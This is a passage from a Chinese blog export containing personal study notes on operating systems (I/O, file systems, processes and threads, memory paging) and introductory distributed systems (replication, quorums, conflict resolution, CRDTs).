    <content type="text"><![CDATA[5.1I/O硬件原理5.1.1I/O设备： 块设备：所有传输以一个或多个完整的（连续的）块为单位。块设备的基本特征是每个块都能独立于其他块而读写。 字符设备：以字符为单位发送或接受一个字符流，而不考虑任何块结构。5.1.2设备控制器：把串行的位流转换为字节块，并进行必要的错误校正工作。5.1.3内存映射I/Ocpu与设备的控制寄存器和数据缓冲区进行通信有三种方法： 一是I/O空间和内存空间分开 二是将I/O映射到内存的高地址处，并且保证用户地址空间中不会包含这些地址空间。 三则是前两种的空格。5.1.4直接存储器存取；大部分计算机用到一种称为直接存储器（DMA）的硬件设备来进行内存和外部设备之间的通信，这样的好处是绕过cpu，不需要进行相应的保护现场、修改内存地址、取指令等操作，数据传输速率大大提高。唯一有点美中不足的就是，DMA运行时会占用总线。5.1.5重温中断：当一个I/O设备完成交给它的工作时，它就产生一个中断（假设操作系统已经开放中断），它是通过在分配给他的一条总线信号线上置起信号而产生中断的。5.2I/O软件原理5.2.1I/O软件的目标：它可以访问任意I/O设备而无需事先指定设备。5.2.5实现I/O的方式： 程序控制I/O：让操作系统做全部的工作， 中断驱动I/O：让CPU等待当前正被其他进程占用的设备变为就绪的同时，可以做某些其他事情的方式就是采用中断。 使用DMA的I/O：让DMA来传送I/O数据而不是CPU。5.3I/O软件的层次： 中断处理程序：使先前阻塞的驱动程序恢复能够继续运行的状态。 设备驱动程序：控制连接到计算机I/O设备的某些特定的代码称为设备驱动程序。 与设备无关的I/O软件：包括操作系统定义的一组驱动程序必须支持的函数、I/O设备的命名、缓冲、错误报告、分配与释放专用设备。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[现代操作系统第四章——文件系统]]></title>
    <url>%2F2019%2F03%2F06%2FMOS-chapter4%2F</url>
    <content type="text"><![CDATA[文件系统：文件是进程创建的信息逻辑单元，每个文件之间相互独立。而操作系统中处理文件的部分称为文件系统，其主要解决了以下几个问题： 如何找到信息 如何防止一个用户读取另一个用户的数据 如何知道哪些块是空闲块4.1文件：4.1.1文件命名：许多文件系统支持文件名用圆点分隔开成为两部分，圆点前是作为索引的任意的帮助用户迅速找到这个文件的名字，圆点后是文件扩展名。4.1.2文件结构： 无结构方式：操作系统不提供任何帮助，也不会构成任何障碍。 记录方式：文件是具有固定长度记录的序列，每个记录都有其内部结构。读操作返回一个记录，而写操作追加一个记录。 树方式：文件及这种结构中由一个记录树构成，每个记录并不具有同样的长度，而记录固定位置上有一个“键”字段。这棵树按照“键”字段进行排序。4.1.3文件类型： 字符特殊文件 块特殊文件4.1.4文件存取： 顺序存取 随机存取4.1.5文件属性：包括文件创建的日期和时间、文件大小等的附加信息称为文件属性。4.2目录文件系统通常提供目录或文件夹用于记录文件，在很多系统中目录本身也是文件。4.2.1一级目录系统：一个目录中包含所有的文件，该目录有时也成为根目录。4.2.2层次目录系统：一个目录树以分组的方式将不同用户分隔开，不同的用户可以为自己的目录树创建自己的私人根目录。4.2.3路径名： 绝对路径名：由从根目录到文件的路径组成。 相对路径名：和工作目录一起使用。文件系统的实现：4.3.1文件系统的布局：文件系统放到磁盘上。多数磁盘划分为一个或多个分区，每个分区中有一个独立的文件系统，磁盘的0号扇区称为主引导记录（MBR），用来引导计算机。在MBR的结尾是分区表，该表给出了每个分区的起始和结束地址。4.3.2文件的实现：文件存储实现的的关键问题是记录各个文件分别用到哪些磁盘块。 连续分配：每个文件作为一连串连续数据块存储到磁盘上。 链表分配：为每个文件构造磁盘块链表，每个块的第一个字作为指向下一个块的指针，块的其他部分存放数据。 在内存中采用表的链表分配：链表分配的指针会占块的一部分字节，使得一个块存储的字节数不再是2的幂次方，解决方法是把每个磁盘块的指针字放在内存中的一个表中。 i节点：给每个文件赋予一个称为i节点的数据结构，其中列出了文件属性和文件快的磁盘地址。（最常用）4.3.3目录的实现目录项中提供了查找文件磁盘块所需要的信息。目录系统的主要功能是把阿斯克码文件名映射成定位文件数据所需的信息。与此密切相关的问题是在何处存放文件属性。 一种方法是把文件属性直接存放在目录项中。 另一种方法是把文件属性存放在i节点而不是目录项中。4.3.4共享文件： 第一种方法是将一个用户目录中的共享文件的磁盘地址赋值到另一个用户的目录中。 让系统建立一个类型为LINK的新文件，并把该文件放在另一个用户的目录下。4.3.5日志结构文件系统：将整个磁盘结构化为一个日志。每隔一段时间，或是有特殊需要时，被缓冲在内存中的所有未决的写操作都被放到一个单独的段中，作为日志末尾的一个邻接段写入磁盘。4.3.6日志文件系统： 保存一个用于记录系统下一步将要做什么的日志。这样当系统在完成它即将完成的任务前崩溃时，重新启动后，可以通过查看日志，获取崩溃前计划完成的任务。4.3.7虚拟文件系统抽象出所有的文件系统都共有的部分，并且将这部分代码放在单独的一层，该层调用底层的实际文件系统来具体管理数据。4.4文件系统管理和优化4.4.1磁盘空间管理：存储n个字节的文件可以有两种策略：分配n个字节的连续磁盘空间，或者把文件分成很多个连续（或者不一定连续）的块。现在几乎所有的文件系统都把文件分割成固定大小的块来存储，各块之间不一定相邻。 块大小：大的块浪费空间，小的块浪费时间。大的块性能高但是空间利用率低，而小的块的相反。 记录空闲块：一种方法将空闲块用磁盘链表链接起来，另一种方法是使用位图。 磁盘份额：系统管理员分给每个用户拥有文件和块的最大数量，操作系统确保每个用户不超过分给他们的配额。4.4.2文件系统备份：物理转储：从磁盘的第0块开始，将全部的磁盘块按序输出到磁带上，直到最后一块复制完毕。逻辑转储：从一个或几个指定的目录开始，递归的转储其自给定基准日期后有所更改的全部文件和目录，步骤如下： 标记所有目录和修改过的文件。 取消不包含修改过文件的目录。 转储目录。 转储文件。4.4.3文件系统的一致性4.4.4文件系统性能： 高速缓存。 块提前读。4.4.5磁盘碎片整理：移动文件使文件相邻填补空洞，把所有的空闲空间放在一个或多个大的连续的区域内。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[现代操作系统第二章——进程]]></title>
    <url>%2F2019%2F03%2F06%2FMOS-chapter2%2F</url>
    <content type="text"><![CDATA[2.1进程： 2.1.1进程模型：进程就是一系列相关事情的抽象，e.g.一个厨师准备材料，生火煮水，按照菜谱做一顿饭整个过程就是一个进程2.1.2进程的创建：一件事情自然包括开始和结束，进程也不例外，相比于关心进程创建（因系统而异），我们更应该关心下进程什么时候会被创建。进程创建的原因主要有以下几种： 1）系统初始化 2）执行了正在运行的进程所调用的进程创建系统调用 3）用户请求创建了一个新进程 4）一个批处理作业的初始化两个进程间有不同的地址空间，当然某些稀有资源是共享的。2.1.3进程的终止：进程的终止同样有数种方式： 1）执行完任务正常退出 2）发生错误，返回错误代码，正常退出 3）被其他进程杀死，非正常退出 4）严重错误，非正常退出（比如说访问了不存的内存，执行了非法指令或除数为0等）2.1.4进程的层次结构：在unix中，父进程和其所有子女后裔组成一个进程组在windows中，所有进程都是地位相同的，但是父进程有一个可以转移的、控制子进程的句柄。2.1.5进程的状态：由于cpu的资源是有限的，但是可能同时存在多个进程争夺cpu资源，这样一来进程就产生了不同的状态： 1）就绪态，实际占用cpu 2）就绪态，可运行，但由于cpu已被占满，等待空闲cpu 3）阻塞态，除非某种外部事件发生，否则进程不能运行，一般来说情况有两种：其一是等待I/O输入拉取数据；其二是这个进程等待进入共享资源状态间联系： 1）就绪-&gt;运行：根据调度程序切换 2）运行-&gt;就绪：当属于此进程的时间片用完后，若其还未结束，则让出cpu转为就绪状态等待调度程序 3）运行-&gt;阻塞：需要等待某些事情才能继续执行 4）阻塞-&gt;就绪：等待的事情完成了，切为就绪态附加：阻塞-&gt;运行可以实现，只要这时候cpu空闲即可，但是就绪到-&gt;阻塞不会实现，因为进程进入就绪态代表他可以运行，而一个进程只有遇到需要等待的事情时，才会进入阻塞态，但是就绪态的进程状态不会改变，也就是说他不会有需要等待的事情发生，所以不可能从就绪态直接切换到阻塞态。2.1.6进程的实现：那么，进程有哪些东西来表示的呢？或者说一个进程由哪些变量来唯一表示。操作系统会维护一个进程表，里面有进程状态的重要信息，包括：程序计数器、堆栈指针、内存分配情况、所打开文件的状态、账号和调度信息，以及其他在进程由运行态转换成就绪态或阻塞态时所必须要保存的信息详见52页。2.1.7多道程序设计模型：我们的目标是，尽可能的让cpu有活干，也就是说，尽可能的让cpu中执行的进程处于cpu计算的比例大于阻塞等待输入输出的比例。 2.2线程：线程和进程神似，不同的是，各个线程共享其进程的地址空间和所有可用的数据。 2.2.1线程的使用：使用线程的理由： 1）将一个进程分成多个线程，相当于一系列动作拆分成多个动作，当你煮水的时候可以同时煮菜。2）线程的创建和撤销比进程快10~100倍，在有大量线程需要动态和快速修改时，具有这一特性很有用。3）如果存在大量的计算和大量的I/O处理，拥有多个线程允许这些活动批次重叠进行，提高执行速率。2.2.2经典的线程模型：进程模型基于两种独立的概念：资源分组处理与执行。资源管理的单位是进程而不是线程。线程概念试图实现的是，共享一组资源的多个线程的执行能力，以便这些线程可以为完成某一项任务而共同工作。 2.2.4在用户空间实现线程：把整个线程包放在用户空间中，内核对线程包一无所知。每个进程都有专用的线程表。优点： 1）进行线程切换可以再几条指令内完成，比内核中实现要快一个数量级。 2）不需要陷阱，不需要上下文切换，不需要对内存高速缓存进行刷新，使得线程调度非常快捷。 3）允许每个进程有自己定制的调度算法。缺点： 1）实现阻塞调用的方式效率不高也不优雅。 2）若一个线程引起页面故障时，内核会阻塞整个进程和所有线程，即便其他线程能用。 3）如果一个线程开始运行，那么在该进程中的其他线程就不嗯能够运行，除非第一个线程自动放弃cpu。争论点：多线程的提出是为了应对经常发生线程阻塞的的情况，对于基本上是cpu密集型而且极少有阻塞的应用程序来说，多线程没啥意义。2.2.5在内核中实现线程：内核中有记录所有线程的线程表。引发的问题： 1）如果一个进程创建了一个子进程，子进程应该继承哪些线程？ 2）进程间通信时，信号该给哪个线程？2.2.6混合实现：使用内核级线程，然后将用户级线程与某些或者全部内核线程多路复用起来。2.2.7调度程序激活机制：2.2.8弹出式线程：一个消息的到达导致系统创建一个处理该消息的线程。2.2.9使单线程代码多线程化。 2.3进程间通信：问题： 1）如何传递消息 2）确保两个或多个进程在关键活动中不会出现交叉 3）与正确的顺序有关，比如说打印进程得在产生数据的进程后面2.3.1竞争条件：两个或多个进程读写某些共享数据，而最后的结果取决于进程运行的精确顺序，成为竞争条件。2.3.2临界区：互斥：以某种手段确保当一个进程使用一个共享变量或文件时，其他进程不能做同样的事情。临界区：对共享内存进行访问的程序片段。好的解决方案的条件： 1）任何两个进程不能同时处于其临界区。 2）不应对cpu的速度和数量进行假设。 3）临界区外运行的进程不得阻塞其他进程 4）不得使用进程无限等待进入临界区。2.3.3忙等待的互斥：当进入不到临界区时，一直发出邀请知道能进位置。 1）屏蔽中断：一个进程进入临界区后关闭所有中断，离开时打开中断。问题： a.如果进程进入了不离开怎么办。 b.对于多处理器而言，一个处理器的中断仅针对它本身有效。 2）锁变量：给临界区加锁。问题：若进程a测试锁，能进，但是刚好其时间片到切换到进程b，进程再次检测，因为a还没来得及修改，所以b能进，并修改，而后轮到a，a又修改了一次。此时有2个进程在访问临界区资源。 3）严格轮换法：每个进程都有固定的访问临界区的时间，不管你实际是否在访问临界区，这样的话，若是a想访问临界区资源，但是此时是b的访问时间，但是b实际并没有访问临界区的资源，这样一来a就被一个临界区之外的进程阻塞了，违反了上述第三个条件。 4）peterson解法在需要时使进程等待，知道能安全进入临界区。 5）TSL指令：TSL （test and set lock）测试并加锁。这个保证读字和写字时不可分割的，即该指令结束前其他处理器均不允许访问该内存。2.3.4睡眠并唤醒：peterson和tsl解法都是正确的，但是有忙等待的缺点。若一个进程想访问某个临界区未果时进入休眠模式，并等待外部条件唤醒。缺点：有可能永远沉睡。2.3.5信号量：一个累计唤醒次数的整形变量。将检查数值、修改变量值以及可能发生的睡眠操作作为一个单一的、不可分割的源自操作。可以通过将他们内置到一个系统调用中实现。2.3.6互斥量：互斥量是一个可以处于两态之一的变量：解锁和加锁。2.3.8消息传递：达到同步效果（之前有管城、互斥量信号量的结合）的另一种方法：前一个调用向一个给定的目标发送一条消息，后一个调用从一个给定的源接受一条消息。如果没有消息可用，则接受者可能被阻塞，知道一条消息到达，或者，带着一个错误码立即返回。2.3.9屏障在有些应用中划分了若干个阶段，只有所有进程都就绪着手下一个阶段时，才能进入下一个阶段，先完成的阶段到达屏障，等待其他进程。 2.4调度调度需要决定哪个需要进行以及进行多少时间。 2.4.1调度极少 1）何时进行调度。 a.在创建一个新进程后，可由调度程序合法选择先运行父进程还是子进程。 b.在一个进程退出时选择一个就绪的进程。 c.当一个进程阻塞时，选择另一个进程进行。 d.在一个I/O中断发生时，必须做出调度决策，决定是否让新就绪的进程运行 2）调度算法： a.批处理：吞吐量 周转时间 cpu利用率前两个时衡量的重要因素，注意吞吐量大不代表周转时间快，考虑多个小作业和一个贼大作业，一般是把大作业放后面做。 b.交互式系统：响应时间 均衡性,响应时间是首要因素 c.实时系统：满足截止时间 （比如音频传输，如果超过一定时间就会卡顿）可预测性2.4.2批处理系统： 1）先来先服务 2）最短作业优先 3）最短剩余作业优先2.4.3交互式系统的调度 1）轮转调度 2）优先级调度 3）多级队列：优先级高时间片少，因为优先级高代表要响应快，而同一优先级里一般会有多个进程，这代表这多个进程反应都要快。优先级低代表要处理的数据大，所以时间片长（减少进程切换有利于提高效率），注意这里是指同一优先级中一个进程的时间片长，若是有优先级高的进程加入，则会无条件切换到优先级高的进程。也就是说，这其实是，在没有比他更高优先级的进程存在时，同级的进程切换尽可量少。 4）最短进程优先 5）保证调度 6）彩票调度 7）公平分享调度：上面的都只是考虑进程本身却没考虑到进程所属，比如说用户a9个进程，用户b1个进程，若是上面的调度算法，则用户2只占cpu的10%，而采用公平分享调度，可以确保用户b占用cpu的50%。假设用户a 有ABC当然不一定是每个用户平分整个cpu，具体划分方法可以商榷。2.4.4实时系统中的额调度：实时系统中有一条很重要的原则：正确的但是迟到的应答往往比没有还要糟糕（当然偶尔很少会有些容忍）2.4.5策略和机制将调度算法以某种形式参数化，而参数可以由用户进程调谐。2.4.6线程调度2.5经典的IPC问题互斥量：保证一段时间只有一个用户访问临界区信号量：睡眠或者活跃状态量：判断是否睡眠或者活跃的依据 lastmodified 20170302 22:32]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[现代操作系统第三章——存储管理]]></title>
    <url>%2F2019%2F03%2F06%2FMOS-chapter3%2F</url>
    <content type="text"><![CDATA[存储管理：操作系统中管理分层存储器体系的部分称为存储管理器。它的任务是有效地管理内存，即记录哪些内存是正在使用的，哪些内存是空闲的；在进程需要时为其分配内存，在进程使用完后释放内存。 3.1无存储管理器抽象：早期存储器没有抽象，这意味着同一时间内内存中只能运行一个进程， 若运行第二个进程则会把原来的进程覆盖掉。 3.2 一种存储器抽象：地址空间3.2.1地址空间的概念：地址空间是一个进程可用于寻址的一套地址集合。每个进程都有一个独立于其他进程的地址空间。 问题：独立的地址空间要解决的一个问题是，一个程序的地址中的28所对应的物理地址要和另一个程序中的地址28所对应的地址空间不同。在内存足够大的情况下，可采用下述方式解决这个问题： 基址寄存器与界限寄存器：使用一种简单的动态重定位的方法，当一个程序运行时，程序的起始物理地址装载到基址寄存器中，程序的长度装载到界限寄存器中。每当进程访问内存时，CPU硬件会在把地址发送到内存总线前，自动把基址值加到进程发出的地址值上，同时，它检查提供的地址是否大于等于界限寄存器里的值，若是，会产生错误并中止访问。3.2.2交换技术：若内存不够大怎么办呢？事实上所有进程所需的RAM数量总和通常远远超出存储器能够支持的范围。而处理内存超载的方法一般有以下两种： 1)交换技术：把一个进程完整调入内存，使该内存运行一段时间，然后把它存回磁盘。 2)虚拟内存。这里着重介绍交换技术，交换技术的在于，若事先不知道程序的大小，或者程序在运行的过程中大小会随之改变，那么就会产生诸如空洞或内存不够的问题。一个方法是程序装入时便预先分配更大的内存。但是如果预设的内存不够大的话，该程序会调出内存，直到内存有足够大的空间时才会放回。而由于每个进程大小不一样，所以调出内存存到磁盘的空间也不一样，这也使得在经过很多次交换之后，会出现一个又一个的空洞。3.3虚拟内存：一般来说一个程序在运行时不会用到所有的代码，甚至同一时间一个程序只会运行一小部分的代码，这也使得如果每次都把一个程序的所有代码都装进内存显然会很浪费。这也使得人们创造了另一种技术，虚拟内存。虚拟内存的基本思想是：每个程序拥有自己的地址空间，这个空间被分割成多个块，每个块称作一页或者页面。每一页有连续的地址范围，这些页被映射到物理内存，只有装载程序当前所需要的代码的页面会放入内存中，若是程序需要的页面不在内存中，就会产生一个页面故障，从磁盘中调出所需的页面并覆盖掉内存中的一个页面。那么究竟覆盖掉哪个页面呢？这就是页面调度算法索要解决的问题。## 3.3.1分页：虚拟地址空间按照固定大小划分成成为页面的若干单元，在物理内存中对应的页面称为页框。而虚拟地址到物理地址的映射是通过MMU（内存管理单元）实现的。假设一个虚拟地址有16位，那么一般高四位是页表号，低12位是偏移量。当进程需要访问某个字节时，它会把该字节所属的页面号发送给MMU。MMU中记载着虚拟地址的页表号和物理地址的页框号所对应的映射，当MMU收到页表号时，会找到其对应的物理地址的页框号，然后将页框号拼接到偏移地址的高位形成送往内存的物理地址。## 3.3.2加速分页过程：事实上计算机中存在这样的现象：大多数程序总是对少量的页面进行多次的访问。基于这样的现象，计算机设置一个称为TLB（转换检测缓冲区）的小型硬件设备，将虚拟地址直接映射到物理地址而不需要在MMU中查询页表项。## 3.3.5针对大内存的页表：1、多级页表：一个页表中套着多个二级页表，若不够，则每个二级页表中套多个三级页表，以此类推。2、倒排页表：不再是一个页表对应一个页框，而是一个页框对应一个（进程，虚拟页面）项，为了解决查找速度慢的问题，我们可以采用TLB和散列表的方法减少查询量。3.4页面置换算法： 最优页面置换算法：将每个页面都可以用在该页面首次被访问前所要执行的指令数作为标记，每次置换时置换标记最大的页面。然而这样几乎不能实现。 最近未使用页面置换算法：随机地从类编号最小的非空类中挑选一个页面淘汰之。 先进先出页面置换算法：由操作系统维护一个所有当前在内存中的页面的链表，最新进入的页面放在表尾，最久进入的页面放在表头。当发生页面中断时，淘汰表头的页面并把新调入的页面加到表尾。 第二次机会页面置换算法：寻找一个最近时钟间隔一来没有被访问过的页面。给每个页面维护一个标记R，若最老的页面R=1，将其R置0并放到末尾，就好像是新加入的页面一样。 时钟页面置换算法：第二次页面置换算法是移动每一个页表，而这里仅仅移动一个指针，消耗会少很多。 最近最少使用页面置换算法：老化算法。 工作集页面置换算法：上述所有算法都是请求调页，也就是只有当需要的时候才会被调入。设想一下当一个进程启动时，它会不停产生缺页中断直到其所有的工作集页面都装入内存中，显然太慢了。这里解释一下，一个进程正在使用的页面的结合称为它的工作集。一般而言，一个进程会将其最近k次访问的页面作为其工作集页面，又或者，将最近π秒实际运行实践中它所访问过的页面的集合。当发生页面中断时，首先调出没访问过的，且最近使用时间大于π秒的页面；其次是没访问过的，最近使用时间小于π秒的生存时间最长的页面；最后若所有页面都在π秒内访问过，则优先选取没被修改过的页面。 工作集时钟页面置换算法3.5分页系统中的设计问题3.5.1局部分配策略与全局分配策略3.5.2负载控制3.5.3页面大小3.5.4分离的指令空间和数据空间3.5.5共享页面3.5.6共享库3.5.7内存映射文件3.5.8清除策略3.5.9虚拟内存接口]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式入门篇（零）]]></title>
    <url>%2F2019%2F03%2F06%2Fchapter0%2F</url>
    <content type="text"><![CDATA[Distributed systems for fun and profit推荐一个非常好的分布式系统入门博客，能了解分布式的相关知识，阅读完这个博客之后，可以去上MIT6.824看paper做project了。作者的gayhub 总览：大部分分布式编程主要是解决如何又快又好的使用多台机器来完成一个任务的问题。 Basic:第一章主要是介绍一些有关分布式的一些术语和概念。 Up and down the level of abstraction:第二章主要是深入介绍具体的抽象模型理论，并且讲述一些impossibility results。 Time and order:第三章主要讨论time, order and clock以及三者的多种组合使用。这是非常重要的一个章节，某种程度上来讲，你对这三者的领悟决定了你所设计的分布式系统的性能。 Replication:preventing divergence:第四章主要讲述replication的问题，以及两种主流的实现replication的方法 Replication:accepting divergence:第五章讨论弱一致性保证下的replicatoin。 Appendix:一些paper。(ps:我觉得这章可以不看了，直接上mit6.824那里看paper就行) 本人还是刚入门的萌新，很多分布式系统的概念和知识都不会，所以如果有错漏的地方，请大家不吝指出，一笑而过，而且这里只是写了一点小总结，推荐大家去看原文。 20190225一]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式入门篇（五）]]></title>
    <url>%2F2019%2F03%2F06%2Fchapter5%2F</url>
    <content type="text"><![CDATA[在分布式系统中，要维持“多机表现的像单机”一样是非常困难的，原因在于维护一致性的成本很高，特别是在物理位置相隔很远的两台服务器之间维持一致性难度更高。一致性的难点在于：我们无法保证网络通信是一定可用的，由于网络分区（两台主机失联）的可能性非常大，很容易造成信息冲突；另一方面，任务的顺序也很难保持一致，若选择不通过通信的方式来维护一个全局一致的序号，那么由于时钟的偏差，一段时间后两台主机的时间就会出现较大的差别，造成后来的事件反而排在前面的情况，若选择网络通信的方式来维持一个序号，则要面临网络分区的风险。处理一致性一个较好的方法就是paxos，不同于要求全部主机达成一致，其只要(N/2+1)台主机达成一致(N是节点数量），这时候，因为任意两个大小为(N/2+1)的集合一定存在交集，所以只要(N/2+1)台节点达成一致，那么慢慢的，所有主机都会达成一致，当然paxos也会出现永远无法达成一致的情况（活锁），不过我们暂时不考虑这个。由于维护一致性的成本很高，因此我们需要考虑一下，真的所有任务都需要维持强一致性吗？对于某些可以不需要维持强一致性的任务来说（比如不需要考虑信息到达的次序，只要保证信息都到达了，我们就能得到正确的结果），此时维护强一致性是不必要并且是降低系统可用性的，所以对于这一类任务，我们可以使用一些新的方法。 Replication: weak consistency model protocols author:sworduo date:Mar 4, Mon, 2019 Reconciling different operation orders在分布式网络中，常常出现次序不统一的情况，比如有123三种信息在分布式网络中传输，AB主机接受的信息次序可能是这样的： [A]-&gt;1 2 3 [B]-&gt;2 1 3 这种不一致性很可能会造成毁灭性的后果，比如，假设我们传输的信息不是数字，而是字符串”hello””world””!” [A]-&gt;&quot;hello&quot; &quot;world&quot; &quot;!&quot; [B]-&gt;&quot;world&quot; &quot;!&quot; &quot;hello&quot; 当出现这种情况时，可怕的不是顺序不一致，而是怕出现字符串两种不同的顺序排列组合都成立，但是意思截然不同的情况，这是最致命的。比如： [A]-&gt;“你”“爱”“我”“不“ [B]-&gt;”我“”不“”爱“”你“ 这时候AB接收到的字符串排列后都是有意义的，但是意思截然不同。 Partial quorums之前我们提到的同步读写模型，写的慢，读的快，有保障；异步读写模型，写的快，读的也快，然而正确性没有保障。那我们能不能设计一种新的读写方法，在同/异步之间取得一个速度和质量的平衡呢？partial quorums就是一种类似的方法： the user can choose some number W-of-N nodes required for a write to succeed; and the user can specify the number of nodes (R-of-N) to be contacted during a read.简单来说，每次写的时候将信息同步到W（W&lt;=N)台主机上,读的时候读取R（R&lt;=N）台主机的信息，然后进行比较/合并，根据标记选择最新的返回。只要保证W+R大于N，那么就能获得较强的一致性保证。假设主机数量N=3，那么有： R=1,W=N,读的快，写的慢，有保障，此时就是同步模型。 R=N,W=1,读的慢，写的快，不太保险，因为唯一存储信息的那台节点可能会挂掉。 R=N/2,W=N/2+1,两者之间取得平衡。读的比2快，写的比2快，并且读的结果正确性也挺高的。 那么R+W&gt;N能否保证强一致性呢？ 答案是：不 这是因为系统很难保证N台主机是不变的，具体来说，系统可以保证一共有N台主机，但是不能保证不同时刻的N台主机都是一样的，因为网络分区、宕机等情况的出现，那些无法联络的主机会被集群删去，然后添加新的、不相关的但是可以用的主机，此时新的主机并没有之前保存的信息。此时读的R台主机可能是由存储旧信息的主机+新加入的主机构成，因此读会出错。 Conflict detection and read repair当我读集群中的R台主机时，假如R台主机之间的信息有冲突，我如何决定应该返回哪一个信息： no metadata:系统没有引入任何额外的用于判断顺序的标记，此时返回最后一个到达的主机的信息，比如读ABC三台主机的信息，假设A的信息最后到达，就返回A的信息，虽然有可能C的才是最新的。 Timestamps：用每个信息的时间戳来判断消息的时间顺序。由于时间同步的问题，两台主机之间的时间信息并不一定是可比较的，比如两台主机都是从00:00开始计数，都是通过”人呼吸一次“所花费的时间+1s，然而，很显然两个人的呼吸时间并不完全一致，所以这两台主机”+1s“所用的时间也是不同的，造成两台主机时间不同步，此时两台主机的信息合并时，我们很难通过时间戳来判断信息真实发生的时间的先后顺序。 version numbers:？？？好像还不错。 vertor clocks:使用这个可以判断并发和过时的数据。然而对于一些并发的数据，我们需要人工去确定使用哪一个，因为我们不知道哪个才是最新的。 CRDTs: Convergent replicated data types有一些数据类型是不在乎数据到达的先后次序的，只要求这些数据都到达就可以，不要求到达的顺序。换言之，只要不同的主机接收到相同的数据，那么他们就能得到相同的结果。这些信息一般具有以下这些特点： Associative (a+(b+c)=(a+b)+c), so that grouping doesn’t matter Commutative (a+b=b+a), so that order of application doesn’t matter Idempotent (a+a=a), so that duplication does not matter 举个例子，假如此时节点的任务是计算最大值，显然不管数据到达的顺序如何，最后得到的最大值也是一样的。其他例子： Counters Grow-only counter (merge = max(values); payload = single integer) Positive-negative counter (consists of two grow counters, one for increments and another for decrements) Registers Last Write Wins -register (timestamps or version numbers; merge = max(ts); payload = blob) Multi-valued -register (vector clocks; merge = take both) Sets Grow-only set (merge = union(items); payload = set; no removal) Two-phase set (consists of two sets, one for adding, and another for removing; elements can be added once and removed once) Unique set (an optimized version of the two-phase set) Last write wins set (merge = max(ts); payload = set) Positive-negative set (consists of one PN-counter per set item) Observed-remove set Graphs and text sequences (see the paper)]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式入门篇（四）]]></title>
    <url>%2F2019%2F03%2F06%2Fchapter4%2F</url>
    <content type="text"><![CDATA[Replication: preventing divergence author:sworduo date:Feb 28, Thu, 2019 参考1:袖珍分布式系统四参考2:理解这两点，也就理解了paxos协议的精髓参考3:Paxos协议超级详细解释+简单实例 Replicationreplication问题是分布式系统中最重要的问题，现在有非常多实现replicatoin的算法，因各自的考虑和取舍而表现出极大的差异。接下来，本文将讨论所有这些replication算法的共通之处，而不会针对某一个算法深入讲解。本文将会聚焦于以下四个方面： leader election, failure detection, mutual exclusion, consensus and global snapshots我们首先得知道Replicatoin问题本质上是一个group communication问题。在单机操作系统上，进程间有多种通信方式，共享内存，消息机制等等，然而在分布式系统中，显然系统中的节点只能通过网络通信来进行信息交互。既然设计到网络通信，那么我们首先来考虑一下同步和异步两种通信模型： 我们可以把复制步骤分为4步： (Request) The client sends a request to a server (Sync) The synchronous portion of the replication takes place (Response) A response is returned to the client (Async) The asynchronous portion of the replication takes place基于以上四个步骤，又可以分为同步复制和异步复制。 Synchronous replication同步复制（synchronous replication）又称为：active, or eager, or push, or pessimistic replication，其原理如下图：具体步骤是这样的： 1、client发送请求 2、s1接受到请求，然后阻塞，并将同样的请求发送给其他所有主机 3、s1接到其他所有主机的答复之后，才最终回复client从上述的过程我们可以看出： 这个系统遵循木桶原理，也就是说，系统的性能由最慢的那个节点决定。 系统对网络延迟非常敏感，每一次写入都要访问所有的节点。 一旦有一个server宕机了，系统只能提供读服务。这种模型的好处在于，当client收到回复时，client可以保证此时系统中所有节点都进行了相应的更改。然而有一个非常致命的地方，就是系统几乎不能容忍有节点宕机的情况，并且对延迟非常敏感，使得一次操作可能会非常耗时，且不一定能成功。 Asynchronous replication异步复制在master接收到请求之后，只是做一些简单的local处理，然后直接返回，不阻塞客户端。在这之后再将本次修改同步到网络中的其他节点。从性能角度看，因为复制是异步进行的，延迟非常小，但是系统的一致性是弱一致的，最重要的是系统无法保证数据的持久性，因为写入master的数据，可能在master复制给其他slaver的前，master就故障了，此时数据的就丢失了。 An overview of major replication approaches讲完同步和异步复制两个思路后，我们来看一些稍微具体的算法，有许多方法来对复制算法分类，除了上面的同步和异步外，还能这么分： Replication methods that prevent divergence (single copy systems) and Replication methods that risk divergence (multi-master systems)第一类系统遵循着“”behave like a single system”的原则，当partial failures发生的时候，算法能保证系统中只有一份数据是有效的，实现single-copy consistency的算法主要有： 1n messages (asynchronous primary/backup) 2n messages (synchronous primary/backup) 4n messages (2-phase commit, Multi-Paxos) 6n messages (3-phase commit, Paxos with repeated leader election)这些算法的不同之处在于他们考虑的types of faults不同，上面简单的通过算法中交换消息的数量进行了划分，这么划分的原因是因为作者尝试回答：what are we buying with the added message exchanges?先看一张图：上图来自：Google App Engine的co-founder Ryan Barrett在2009年的google i/o上的演讲《Transaction Across DataCenter》。consistency, latency, throughput, data loss and failover characteristics 归根结底来自于两个不同的复制方法：同步还是异步。下面我们具体看下每一种复制方法。 Primary/backup replication All updated are performed on the primary, and a log of operations (or alternatively, changes) is shipped across the network to the backup replicas. 这里的Primary/backup个人认为可以理解为master/slave，据说不用master/slave是因为这组单词被某些人投诉了。。。最基本的一种复制方法，在复制log上有两种方法： asynchronous primary/backup replication and synchronous primary/backup replication同步方法需要涉及到两个消息（”update” + “acknowledge receipt”），而异步则只有一个(“update”)。但是在mysql中，即使是同步复制也不能完全保证数据的一致性。真实场景中，有几种典型的P/B不合时宜的错误： 主机发送修改给slave，slave接受了修改，然而主机此时挂了，这时候主机不是最新的，而slave却是最新的。 由于网络原因，主机挂了，然后选择新的slave作为主机，然而网络突然又好了，此时变成了2台主机，该怎么选。 